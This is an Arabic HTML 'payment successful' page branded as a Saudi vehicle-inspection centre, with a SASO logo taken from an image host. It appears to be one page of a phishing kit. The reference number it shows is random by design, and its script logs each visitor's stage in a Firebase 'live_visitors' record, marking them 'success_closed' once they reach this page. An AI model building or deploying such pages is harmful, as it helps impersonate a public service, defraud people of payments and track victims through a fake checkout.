<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تم الدفع بنجاح - مركز سلامة المركبات</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }

        .success-container {
            background: #fff;
            width: 100%;
            max-width: 350px; /* تصميم ملموم وهادئ جداً */
            border-radius: 20px;
            padding: 30px 20px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.05);
            text-align: center;
        }

        /* تصغير الصورة العلوية (Quiet) */
        .success-icon-box {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
            margin-top: -15px; /* إمالة بسيطة للأعلى */
        }
        
        .success-img {
            width: 70px; /* حجم هادئ وغير ضخم */
            height: auto;
            object-fit: contain;
        }

        h2 { font-size: 18px; color: #333; margin-bottom: 8px; font-weight: bold; }
        p { font-size: 13px; color: #777; line-height: 1.5; margin-bottom: 25px; }

        .order-details {
            background-color: #fafafa;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 25px;
            text-align: right;
            border: 1px solid #f0f0f0;
        }

        .detail-item {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            margin-bottom: 6px;
            color: #666;
        }

        .detail-item b { color: #333; }

        .btn-home {
            width: 100%;
            background-color: var(--main-green);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 13px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }

        /* الصورة الجديدة (SASO Logo) في الأسفل */
        .footer-logo {
            margin-top: 25px;
            width: 100%;
            max-width: 90px;
            opacity: 0.8;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
    </style>
</head>
<body>

    <div class="success-container">
        <div class="success-icon-box">
            <div style="width: 70px; height: 70px; background-color: #e8f5e9; border-radius: 50%; display: flex; justify-content: center; align-items: center;">
                <span style="font-size: 35px; color: #1e7344;">✓</span>
            </div>
        </div>
        
        <h2>تمت العملية بنجاح</h2>
        <p>شكرًا لك! تم استلام دفعتك بنجاح وجاري إصدار إيصال الخدمة الخاص بك.</p>

        <div class="order-details">
            <div class="detail-item">
                <span>رقم العملية:</span>
                <b id="refNumber">#VSC-######</b>
            </div>
            <div class="detail-item">
                <span>المبلغ المدفوع:</span>
                <b>115.00 ريال</b>
            </div>
            <div class="detail-item">
                <span>حالة الخدمة:</span>
                <b style="color: var(--main-green);">مكتملة</b>
            </div>
        </div>

        <a href="index.html" class="btn-home">العودة للرئيسية</a>

        <img src="https://i.ibb.co/7JPt9dQG/saso-logo.png" class="footer-logo" alt="SASO Logo">
    </div>

    <script>
        // إعدادات Firebase
        const firebaseConfig = { 
            apiKey: "AIzaSyAzXXXXXXXXXXXX", 
            databaseURL: "https://vsc-project-default-rtdb.firebaseio.com/", 
            projectId: "vsc-project" 
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const visitorId = localStorage.getItem('visitorId');

        // توليد رقم مرجعي عشوائي للجمالية
        document.getElementById('refNumber').innerText = "#VSC-" + Math.floor(Math.random() * 900000 + 100000);

        // تحديث حالة الزائر النهائية
        if (visitorId) {
            database.ref('live_visitors/' + visitorId).update({
                page: "تم الدفع بنجاح (Success)",
                status: "success_closed",
                last_active: firebase.database.ServerValue.TIMESTAMP
            });
            
            // تنظيف بيانات الجلسة بعد النجاح
            // localStorage.removeItem('visitorId');
        }
    </script>
</body>
</html>
